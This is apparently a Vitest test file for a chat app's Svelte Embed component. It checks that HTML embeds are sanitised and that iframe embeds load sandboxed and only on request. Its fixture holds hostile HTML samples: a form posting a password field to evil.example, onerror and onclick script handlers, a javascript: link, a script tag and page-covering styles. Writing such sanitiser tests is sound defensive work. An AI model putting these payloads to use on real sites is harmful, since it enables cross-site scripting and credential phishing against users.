// @vitest-environment jsdom
import { flushSync } from 'svelte';
import { describe, expect, it } from 'vitest';
import type { Embed as EmbedRecord } from '$lib/protocol/types';
import Embed from './Embed.svelte';
import { button, render } from '$lib/test/dom';

/** Renders a server-relayed embed as a message shows it, and returns the box it drew. */
function show(embed: EmbedRecord): HTMLElement {
	return render(Embed, { embed });
}

describe('an html embed (§4.8)', () => {
	const hostile = [
		'<style>body { display: none }</style>',
		'<p style="position: fixed; inset: 0">Build <b>green</b></p>',
		'<form action="https://evil.example/"><input name="password" value="x"><button>Sign in</button></form>',
		'<img src="x" onerror="alert(1)">',
		'<a href="javascript:alert(2)" onclick="alert(3)">run</a>',
		'<a href="https://ci.example/42">log</a>',
		'<script>alert(4)</script>'
	].join('');

	it('keeps the text and safe markup, and strips styles, forms, their fields, scripts, handlers and javascript: links', () => {
		const box = show({ kind: 'html', html: hostile });
		const markup = box.innerHTML;
		expect(box.textContent).toContain('Build green');
		expect(box.querySelector('b')?.textContent).toBe('green');
		for (const tag of ['style', 'form', 'input', 'button', 'script']) expect(box.querySelector(tag), tag).toBeNull();
		expect(box.querySelector('[style]')).toBeNull();
		expect(markup).not.toMatch(/\bon[a-z]+=/i);
		expect(markup).not.toContain('javascript:');
		// An image from nowhere media may load from (with no server known here, anywhere) isn't loaded.
		expect(box.querySelector('img')).toBeNull();
	});

	it('opens every link in a new tab, without a referrer or a handle back to the chat', () => {
		const box = show({ kind: 'html', html: hostile });
		const links = [...box.querySelectorAll('a[href]')];
		expect(links.map((link) => link.getAttribute('href'))).toEqual(['https://ci.example/42']);
		expect(links.map((link) => [link.getAttribute('target'), link.getAttribute('rel')])).toEqual([['_blank', 'noreferrer noopener']]);
	});

	it('falls back to its card when it carries no markup', () => {
		const box = show({ kind: 'html', url: 'https://ci.example/42' });
		expect(box.querySelector('.ap-embed-html')).toBeNull();
		expect(box.textContent).toContain('html');
	});
});

describe('an iframe embed (§4.8)', () => {
	it('waits paused until asked, then loads sandboxed with scripts only, no referrer and no permissions', () => {
		const box = show({ kind: 'iframe', url: 'https://view.example/live', title: 'Dashboard' });
		expect(box.querySelector('iframe')).toBeNull();
		button('Load live view', box).click();
		flushSync();
		const frame = box.querySelector('iframe')!;
		expect([frame.getAttribute('src'), frame.title]).toEqual(['https://view.example/live', 'Dashboard']);
		expect(frame.getAttribute('sandbox')).toBe('allow-scripts');
		expect(frame.getAttribute('referrerpolicy')).toBe('no-referrer');
		expect(frame.getAttribute('allow')).toBe('');
	});
});
